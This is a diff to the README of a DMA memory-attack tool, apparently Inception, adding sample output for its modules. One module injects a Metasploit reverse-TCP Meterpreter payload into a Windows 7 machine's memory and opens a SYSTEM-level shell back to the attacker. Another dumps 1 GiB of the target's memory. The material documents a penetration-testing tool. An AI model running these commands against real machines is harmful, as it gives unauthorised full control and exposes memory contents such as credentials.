@@ -238,13 +238,80 @@ Then, in another terminal, we launch Inception:
 
     incept implant --msfpw password --msfopts LHOST=172.16.1.1
 
-TODO: Insert output
+     _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
+     _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
+     _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
+     _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
+     _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|
 
+    v.0.4.0 (C) Carsten Maartmann-Moe 2014
+    Download: http://breaknenter.org/projects/inception | Twitter: @breaknenter
+
+    [?] Will potentially write to file. OK? [y/N] y
+    [!] This module currently only work as a proof-of-concept against Windows 7 SP1
+        x86. No other OSes, versions or architectures are supported, nor is there
+        any guarantee that they will be supported in the future. If you want to
+        change this, send me a wad of cash in unmarked dollar bills or a pull
+        request on github.
+    [?] What MSF payload do you want to use? windows/meterpreter/reverse_tcp
+    [*] Selected options:
+    [*] LPORT: 4444
+    [*] LHOST: 172.16.1.1
+    [*] EXITFUNC: thread
+    [*] Stage 1: Searcing for injection point
+    [================================>                             ]  537 MiB ( 53%)
+    [*] Signature found at 0x219d118c in page no. 137681
+    [*] Patching at 0x219d118c
+    [\] Waiting to ensure stage 1 execution
+    [?] Press [enter] to continue 
+    [*] Restoring memory at initial injection point
+    [*] Stage 2: Searching for page allocated in stage 1
+    [=========================>                                    ]  434 MiB ( 42%)
+    [*] Signature found at 0x1b2d9000 in page no. 111321
+    [*] Patching at 0x1b2d9000
+    [*] Patch verified; successful
+    [*] BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!
+
+In your MSF console, you should see something similar to this:
+
+    msf exploit(handler) > [*] Sending stage (769536 bytes) to 172.16.78.200
+    [*] Meterpreter session 1 opened (172.16.1.1:4444 -> 172.16.78.200:49178) at 2014-08-30 16:23:31 +0200
+
+    msf exploit(handler) > sessions
+
+    Active sessions
+    ===============
+
+      Id  Type                   Information                            Connection
+      --  ----                   -----------                            ----------
+      1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ WIN-11FMQRBAMJ6  172.16.1.1:4444 -> 172.16.78.200:49178 (172.16.78.200)
+
+    msf exploit(handler) > sessions -i 1
+    [*] Starting interaction with 1...
+
+    meterpreter > getuid
+    Server username: NT AUTHORITY\SYSTEM
 
 ### Dump
 
 The `dump` module facilitates dumping of memory from the target to the
-attacking host.
+attacking host:
+
+    incept dump
+
+     _|  _|      _|    _|_|_|  _|_|_|_|  _|_|_|    _|_|_|  _|    _|_|    _|      _|
+     _|  _|_|    _|  _|        _|        _|    _|    _|    _|  _|    _|  _|_|    _|
+     _|  _|  _|  _|  _|        _|_|_|    _|_|_|      _|    _|  _|    _|  _|  _|  _|
+     _|  _|    _|_|  _|        _|        _|          _|    _|  _|    _|  _|    _|_|
+     _|  _|      _|    _|_|_|  _|_|_|_|  _|          _|    _|    _|_|    _|      _|
+
+    v.0.4.0 (C) Carsten Maartmann-Moe 2014
+    Download: http://breaknenter.org/projects/inception | Twitter: @breaknenter
+
+    [*] Dumping from 0x0 to 0x40000000, a total of 1 GiB:
+    [==============================================================] 1024 MiB (100%)
+    [*] Dumped memory to file memdump_0x0-0x40000000_20140830-174305.bin
+    [*] BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!
 
 
 Known bugs / caveats
